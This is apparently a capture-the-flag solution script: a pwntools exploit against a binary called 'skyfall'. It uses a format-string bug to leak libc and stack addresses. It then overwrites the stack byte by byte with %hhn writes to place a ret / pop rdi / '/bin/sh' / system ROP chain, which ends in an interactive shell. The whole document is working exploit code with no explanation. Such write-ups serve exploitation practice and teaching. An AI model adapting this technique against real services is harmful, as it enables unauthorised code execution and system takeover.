#!/usr/bin/env python3

from pwn import *

exe = ELF('p-skyfall')
libc = ELF('./libc.so.6')
ld = ELF('./ld.so')

off_pop_rdi = 0x23835
off_binsh = 0x198031
off_system = 0x493d0
off_ret = 0x231d6

off_libc_on_stack = 0x23290
off_rewrite_stack = 0xf8

num_libc_addr = 41
num_stack_addr = 42

context.binary = exe

args.LOCAL = 0
args.DEBUG = 0

def conn():
    if args.LOCAL:
        p = process("LD_PRELOAD=./libc.so.6 ./ld.so ./skyfall", shell=True)
        if args.DEBUG:
            p = gdb.debug("LD_PRELOAD=./libc.so.6 ./ld.so ./skyfall", shell=True)
    else:
        p = remote("localhost", 61337)

    return p

def rewrite_byte(p: process, nb, addr):
    if (nb <= 16):
        wrstr = " " * nb + "%9$hhn"
    else:
        wrstr = f"%{nb}c%9$hhn"
    wrstr = wrstr.encode().ljust(24, b" ")
    wrstr += p64(addr)
    p.sendlineafter(b"TELL ME RIGHT F NOW WHAT IS YOUR NAME?\n", wrstr)

def write_value(p, val, addr):
    nowa = addr
    for bs in val:
        rewrite_byte(p, bs, nowa)
        nowa += 1

def main():
    p: process = conn()
    p.sendlineafter(b"TELL ME RIGHT F NOW WHAT IS YOUR NAME?\n", b"%41$p %42$p")
    libc_on_stack, stack_on_stack = [int(c, 16) for c in p.recvline()[2:-1].decode().split(" 0x")]
    libc_base = libc_on_stack - off_libc_on_stack
    stack_rewrite = stack_on_stack - off_rewrite_stack
    print(hex(libc_base))
    print(hex(stack_rewrite))
    pon_string = p64(libc_base + off_pop_rdi) + p64(libc_base + off_binsh) + p64(libc_base + off_system)
    pon_string = p64(libc_base + off_ret) + pon_string
    write_value(p, pon_string, stack_rewrite)
    p.interactive()


if __name__ == "__main__":
    main()
